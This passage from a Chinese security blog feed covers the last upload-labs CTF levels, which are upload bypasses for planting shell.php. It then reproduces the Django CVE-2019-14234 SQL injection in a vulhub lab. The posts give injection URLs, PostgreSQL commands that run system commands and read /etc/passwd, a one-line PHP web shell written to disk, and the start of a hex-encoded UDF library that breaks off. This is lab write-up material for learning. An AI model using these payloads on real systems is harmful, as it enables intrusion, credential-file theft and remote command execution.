class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>关键语句</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//存储在服务器的文件的临时副本的名称</span><br></pre></td></tr></table></figure></div>

<p>当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。<br>然后执行<code>if(move_uploaded_file($temp_file, $upload_file))</code>&#x2F;&#x2F;移动到新文件夹</p>
<p>绕过思路是利用代码执行过程有耗费时间的过程。临时webshell文件保存的极短时间，去访问webshell。获取一些信息</p>
<p>我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm4v9oj30tw0gr40r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm4v9oj30tw0gr40r.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Pass-18-图片马结合条件竞争"><a href="#Pass-18-图片马结合条件竞争" class="headerlink" title="Pass-18 图片马结合条件竞争"></a>Pass-18 图片马结合条件竞争</h2><p>思路如上 只是这次多了些判断条件，比如对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。</p>
<hr>
<h2 id="Pass-19-x2F-绕过"><a href="#Pass-19-x2F-绕过" class="headerlink" title="Pass-19 &#x2F;.绕过"></a>Pass-19 &#x2F;.绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm3v0sj30ee094dfy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm3v0sj30ee094dfy.jpg" class="lazyload"></a></p>
<p><code>move_uploaded_file</code>会忽略掉文件末尾的<code>/.</code>。但是Pass9中的文件名是从<code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>中获取的，这里是用户可控的。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm6gavj30ua0dhwj5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm6gavj30ua0dhwj5.jpg" class="lazyload"></a><br>当然也可以用<code>move_uploaded_file</code>函数的00截断漏洞绕过。</p>
<hr>
<h2 id="Pass-20-数组-x2F-绕过"><a href="#Pass-20-数组-x2F-绕过" class="headerlink" title="Pass-20 数组+ &#x2F;. 绕过"></a>Pass-20 数组+ &#x2F;. 绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p>
<p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。<br>并且后缀有白名单过滤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ext = end($file);</span><br><span class="line">$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br></pre></td></tr></table></figure></div>

<p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<br><code>$file[0]</code>为<code>shell.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。<br>此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。<br>而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>shell.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>shell.php</code>。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm5w7zj30f10a474h.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm5w7zj30f10a474h.jpg" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm7y8sj30v20c0gox.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm7y8sj30v20c0gox.jpg" class="lazyload"></a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然很多的题都是考的基础，但还是学到了许多新的知识，继续努力吧！</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-14234 复现挖坑</title>
    <url>/yakko117/2020/02/18/CVE_2019_14234/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>在 <code>Django 1.11.x</code>（1.11.23之前），2.1.x（2.1.11之前）和2.2.x（2.2.4之前）中发现了一个问题。 由于<code>shallow key</code>转换中的错误，<code>django.contrib.postgres.fields.JSONField</code> 的关键字和索引查找以及 <code>django.contrib.postgres.fields.HStoreField</code> 的关键字查找受到SQL注入。 </p>
<span id="more"></span>

<p>例如，可以通过在 <code>key</code> 或索引名称中使用 <code>OR 1 = 1</code>来利用漏洞，使用特制的字典并通过字典扩展将所有记录返回给<code>** kwarg</code>，以将所有记录返回给 <code>QuerySet.filter()</code> 功能。</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>首先先来看一下官方的修复措施<br><a href="https://github.com/django/django/pull/11612/files">Fixed #30664</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" class="lazyload"></a></p>
<p>在 <code>django/db/backends/postgresql/schema.py</code> 中，利用 <code>strip_quotes()</code> 函数封装，将传递的字符串中的 <code>&#39; (引号)</code> 删除，返回移除字符串头尾指定的字符生成的新字符串，进行传参。</p>
<hr>
<p><a href="https://github.com/django/django/pull/11784/files">Fixed #30769</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" class="lazyload"></a></p>
<p>然后将 <code>django/contrib/postgres/fields/hstore.py</code> 文件里面的 <code>KeyTransform类</code>的 <code>as_sql</code> 函数中的直接传递字符串改为了将 <code>self.key_name</code> 单独使用数组进行传递,其中 <code>%%</code> 的意思为 <code>转换说明符</code>，其主要作用为直接转化为单个 <code>%</code> 符号而不需要参数。类似于 <code>\\</code> 和 <code>\</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In[1]: &quot;%%&quot;%()</span><br><span class="line">Out[1]: &#x27;%&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">具体使用方法如下</span></span><br><span class="line"></span><br><span class="line">In [2]: &#x27;%s %%s&#x27;%&#x27;test&#x27;</span><br><span class="line">Out[2]: &#x27;test %s&#x27;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="再看下一个"><a href="#再看下一个" class="headerlink" title="再看下一个"></a>再看下一个</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" class="lazyload"></a></p>
<p>在 <code>django/contrib/postgres/fields/jsonb.py</code> 文件中将对 <code>self.key_name</code> 变量的返回统一改成了使用数组进行转换。并且后期在单元测试中加入了对 <code>JSONField</code>的SQL注入测试</p>
<hr>
<h1 id="靶场复现"><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794">p神流批！</a></p>
<p>进入 <code>http://ip:port/admin/vuln/collection/</code><br>传参 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?detail__a%27b=1</span><br></pre></td></tr></table></figure></div>
<p>会显示将 <code>&#39;</code> 包括进去</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" class="lazyload"></a></p>
<p>说明可以构建查询字段</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id_contains=admin</span><br><span class="line">name_contains=admin</span><br><span class="line">flag_contains=flag&#123;</span><br><span class="line"></span><br><span class="line">?detail__author&#x27;+=+&#x27;&quot;a&quot;&#x27;)--</span><br><span class="line">?detail__author%27+%3d+%27&quot;a&quot;%27)%20and%207778%3dCAST((SELECT%20version())%20AS%20NUMERIC)--</span><br><span class="line">?detail__author&#x27;%3f&#x27;a&#x27;) OR 1%3d2%20 -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#x27;detail</span><br><span class="line">?detail__author&#x27;%3f&#x27;a&#x27;) OR 1%3d2%20 %3bCREATE table cmd_exec(cmd_output text) -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#x27;detail</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output text);</span><br><span class="line"><span class="keyword">COPY</span> cmd_exec <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure></div>

<h2 id="切割脚本"><a href="#切割脚本" class="headerlink" title="切割脚本"></a>切割脚本</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage:python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot;inputfile&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>],<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        sys.stdout.write(<span class="string">r&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(b)))</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2048</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">    fileobj.close()</span><br></pre></td></tr></table></figure></div>

<p><code>PostgreSQL</code> 是一个自由的对象-关系数据库服务器(数据库管理系统)</p>
<h2 id="在root权限下修改数据库密码"><a href="#在root权限下修改数据库密码" class="headerlink" title="在root权限下修改数据库密码"></a>在root权限下修改数据库密码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service postgresql start	//启动服务</span><br><span class="line">su postgres	<span class="comment">#切换到数据库用户下</span></span><br><span class="line">psql  postgres	<span class="comment">#进入数据库</span></span><br><span class="line">alter user postgres with password <span class="string">&#x27;postgres&#x27;</span> <span class="comment">#修改数据库的密码为：postgres</span></span><br><span class="line">psql -h 127.0.0.1 -U postgres -W   使用帐号密码登入系统</span><br></pre></td></tr></table></figure></div>

<h2 id="查看数据中的信息"><a href="#查看数据中的信息" class="headerlink" title="查看数据中的信息"></a>查看数据中的信息</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\l  #列出数据库</span><br><span class="line">\du  #列出数据库的用户</span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;./&#x27;</span>);  #列出系统目录列表(不能是绝对路径)</span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;postgresql.auto.conf&#x27;</span>, <span class="number">0</span>, <span class="number">200</span>);  #读取系统文件</span><br></pre></td></tr></table></figure></div>

<h2 id="使用数据库获取系统信息"><a href="#使用数据库获取系统信息" class="headerlink" title="使用数据库获取系统信息"></a>使用数据库获取系统信息</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn(t TEXT);</span><br><span class="line"><span class="keyword">copy</span> pwn <span class="keyword">from</span> <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> pwn limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br></pre></td></tr></table></figure></div>

<h2 id="使用数据库写文件"><a href="#使用数据库写文件" class="headerlink" title="使用数据库写文件"></a>使用数据库写文件</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn (t TEXT);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pwn(t) <span class="keyword">values</span> (<span class="string">&#x27;&lt;?php @system(&quot;$_GET[cmd]&quot;);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pwn;</span><br><span class="line"><span class="keyword">copy</span> pwn(t) <span class="keyword">to</span>  <span class="string">&#x27;/tmp/cmd.php&#x27;</span>;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line"><span class="keyword">copy</span>  (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="使用数据库执行系统命令"><a href="#使用数据库执行系统命令" class="headerlink" title="使用数据库执行系统命令"></a>使用数据库执行系统命令</h2><p>执行系统命令需要用到 <code>udf库</code>，(这个有点类似mysql 提权)<br>创建 <code>.so</code>，执行自己需要用的命令</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, decode(<span class="string">&#x27;7f454c4602010100000000000000000003003e0001000000d00d0000000000004000000000000000f82e0000000000000000000040003800070040001d001a000100000005000000000000000000000000000000000000000000000000000000fc16000000000000fc1600000000000000002000000000000100000006000000001e000000000000001e200000000000001e200000000000e002000000000000e80200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000ec14000000000000ec14000000000000ec140000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000001e000000000000001e200000000000001e200000000000000200000000000000020000000000000100000000000000040000001400000003000000474e5500bc18d001b8d1db33f56f9fa1d194c131375c6a5c00000000030000001d00000002000000070000008440030810890c99880c008dc84400001d0000002400000029000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900100c0000000000000000000000000000ec00000012000000000000000000000000000000000000001101000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008401000012000000000000000000000000000000000000007d0100001200000000000000000000000000000000000000ba00000012000000000000000000000000000000000000008a0100001200000000000000000000000000000000000000480100001200000000000000000000000000000000000000e400000012000000000000000000000000000000000000001f01000012000000000000000000000000000000000000001901000012000000000000000000000000000000000000007701000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000009f0000001200000000000000000000000000000000000000d300000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000007101000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000004d01000012000000000000000000000000000000000000000301000012000000000000000000000000000000000000006b0100001200000000000000000000000000000000000000400100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000eb00000010000000000000000000000000000000000000003b0100001200000000000000000000000000000000000000f100000012000c0031100000000000000d00000000000000ca00000012000c00bc0f0000000000007500000000000000a501000010001700e0202000000000000000000000000000c100000012000c00af0f0000000000000d00000000000000fa00000012000c003e100000000000002201000000000000b801000010001800e82020000000000000000000000000005e01000012000c007a1200000000000024020000000000002601000012000c0060110000000000000d000000000000008300000012000c00dd0e0000000000006200000000000000ac01000010001800e020200000000000000000000000000010000000120009